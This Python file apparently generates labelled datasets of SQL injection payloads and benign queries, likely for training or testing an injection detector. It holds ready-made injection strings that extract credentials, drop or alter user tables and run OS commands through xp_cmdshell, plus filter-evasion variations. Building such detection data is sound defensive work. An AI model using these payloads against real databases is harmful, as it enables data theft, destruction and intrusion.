import random
from typing import List, Dict
from enum import Enum

class AttackType(Enum):
    UNION_BASED = "union_based"
    BOOLEAN_BASED = "boolean_based"
    TIME_BASED = "time_based"
    ERROR_BASED = "error_based"
    STACKED_QUERIES = "stacked_queries"

class PayloadGenerator:
    def __init__(self):
        self.payloads = {
            AttackType.UNION_BASED: [
                "' UNION SELECT NULL, NULL, NULL--",
                "' UNION SELECT username, password FROM users--",
                "' UNION ALL SELECT NULL, table_name FROM information_schema.tables--",
                "1' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
                "admin' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT @@version, NULL, NULL--",
                "' UNION SELECT NULL, database(), user()--",
            ],
            AttackType.BOOLEAN_BASED: [
                "' OR '1'='1",
                "' OR 1=1--",
                "admin' OR '1'='1'--",
                "' OR 'x'='x",
                "1' AND '1'='1",
                "' OR 1=1#",
                "') OR ('1'='1",
                "' OR 'a'='a'--",
            ],
            AttackType.TIME_BASED: [
                "'; WAITFOR DELAY '00:00:05'--",
                "1'; IF (1=1) WAITFOR DELAY '00:00:05'--",
                "'; SELECT SLEEP(5)--",
                "1' AND SLEEP(5)--",
                "'; BENCHMARK(10000000, MD5('test'))--",
                "1' OR SLEEP(5)='0",
            ],
            AttackType.ERROR_BASED: [
                "'",
                "''",
                "' AND 1=CONVERT(int, (SELECT @@version))--",
                "' AND 1=CAST('test' AS int)--",
                "' AND extractvalue(1, concat(0x7e, version()))--",
                "' AND updatexml(1, concat(0x7e, database()), 1)--",
            ],
            AttackType.STACKED_QUERIES: [
                "'; DROP TABLE users--",
                "1'; DELETE FROM users WHERE '1'='1",
                "'; INSERT INTO users VALUES ('hacker', 'password')--",
                "1'; UPDATE users SET password='hacked'--",
                "'; EXEC xp_cmdshell('dir')--",
            ]
        }
        
        self.benign_queries = [
            "SELECT * FROM products WHERE id = 1",
            "SELECT name, email FROM users WHERE status = 'active'",
            "INSERT INTO orders (user_id, product_id) VALUES (123, 456)",
            "UPDATE products SET price = 29.99 WHERE id = 5",
            "DELETE FROM cart WHERE user_id = 100 AND created_at < '2023-01-01'",
            "SELECT COUNT(*) FROM orders WHERE date > '2024-01-01'",
            "SELECT p.name, c.name FROM products p JOIN categories c ON p.category_id = c.id",
        ]
    
    def generate_attack_payloads(
        self,
        count: int = 100,
        attack_types: List[AttackType] = None
    ) -> List[Dict]:
        """Generate attack payloads"""
        
        if attack_types is None:
            attack_types = list(AttackType)
        
        payloads = []
        per_type = count // len(attack_types)
        
        for attack_type in attack_types:
            type_payloads = self.payloads.get(attack_type, [])
            
            for _ in range(per_type):
                payload = random.choice(type_payloads)
                # Add some variations
                if random.random() > 0.5:
                    payload = self._add_variation(payload)
                
                payloads.append({
                    'query': payload,
                    'type': attack_type.value,
                    'is_malicious': True
                })
        
        return payloads
    
    def generate_benign_payloads(self, count: int = 100) -> List[Dict]:
        """Generate benign queries"""
        payloads = []
        
        for _ in range(count):
            query = random.choice(self.benign_queries)
            # Add some variations
            if random.random() > 0.5:
                query = self._add_benign_variation(query)
            
            payloads.append({
                'query': query,
                'type': 'benign',
                'is_malicious': False
            })
        
        return payloads
    
    def generate_mixed_payloads(
        self,
        total: int = 100,
        malicious_ratio: float = 0.5
    ) -> List[Dict]:
        """Generate mix of malicious and benign payloads"""
        
        malicious_count = int(total * malicious_ratio)
        benign_count = total - malicious_count
        
        payloads = []
        payloads.extend(self.generate_attack_payloads(malicious_count))
        payloads.extend(self.generate_benign_payloads(benign_count))
        
        random.shuffle(payloads)
        return payloads
    
    def _add_variation(self, payload: str) -> str:
        """Add variations to attack payload"""
        variations = [
            lambda p: p.upper(),
            lambda p: p.lower(),
            lambda p: p.replace(' ', '/**/'),
            lambda p: p.replace('--', '#'),
            lambda p: p.replace("'", '"'),
        ]
        
        variation = random.choice(variations)
        try:
            return variation(payload)
        except:
            return payload
    
    def _add_benign_variation(self, query: str) -> str:
        """Add variations to benign query"""
        # Replace random values
        if 'id = ' in query:
            new_id = random.randint(1, 1000)
            query = query.replace('id = 1', f'id = {new_id}')
        
        return query